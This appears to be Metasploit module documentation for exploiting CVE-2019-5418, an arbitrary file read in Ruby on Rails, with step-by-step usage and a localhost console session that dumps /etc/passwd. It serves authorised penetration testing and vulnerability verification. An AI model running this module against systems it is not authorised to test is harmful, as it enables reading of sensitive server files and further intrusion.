## Vulnerable Application

  Ruby on Rails versions <= 5.2.2. The following example shows how to recreate the vulnerable environment on Linux:

  https://chybeta.github.io/2019/03/16/Analysis-for%E3%80%90CVE-2019-5418%E3%80%91File-Content-Disclosure-on-Rails/

## Verification Steps

  1. Start a Rails server using a vulnerable version 
  2. Start msfconsole
  3. Do: ```use auxiliary/gather/rails_doubletap_file_read```
  4. Do: ```set ROUTE /your_route```
  5. Do: ```set RHOSTS target```
  6. Do: ```set TARGET_FILE /absolute/path/to/remote/file.txt```
  7. Do: ```run```
  8. If everything goes smoothly, you should get the contents of the remote file printed to the console.


## Options

  **ROUTE**

  This is a web path or "route" on the vulnerable server. Since the vulnerability lies within the PathResolver of Rails, the route should be in the server's routes.rb file. 

  **TARGET_FILE**

  This is the file to be read on the remote server. This *must* be an absolute path (eg. /etc/passwd).

## Advanced Options

  **SKIP_CHECK**
  
  This options skips the initial vulnerability check and continues thinking the server is vulnerable. 

## Scenarios

### Version of software and OS as applicable


  ```
msf5 > use auxiliary/gather/rails_doubletap_file_read
msf5 auxiliary(gather/rails_doubletap_file_read) > options

Module options (auxiliary/gather/rails_doubletap_file_read):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                        yes       The target address range or CIDR identifier
   ROUTE        /msf             yes       A route on the vulnerable server.
   RPORT        80               yes       The target port (TCP)
   SSL          false            no        Negotiate SSL/TLS for outgoing connections
   TARGET_FILE  /etc/passwd      yes       The absolute path of remote file to read.
   VHOST                         no        HTTP server virtual host

msf5 auxiliary(gather/rails_doubletap_file_read) > set RHOSTS localhost
RHOSTS => localhost
msf5 auxiliary(gather/rails_doubletap_file_read) > set RPORT 8000
RPORT => 8000
smsf5 auxiliary(gather/rails_doubletap_file_read) > set ROUTE /demo
ROUTE => /demo
msf5 auxiliary(gather/rails_doubletap_file_read) > run
[*] Running module against 127.0.0.1

[+] Target is vulnerable!
[*] Requesting file /etc/passwd
[+] Response from server:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...snip...
systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
postgres:x:105:112:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash

[*] Auxiliary module execution completed  
```
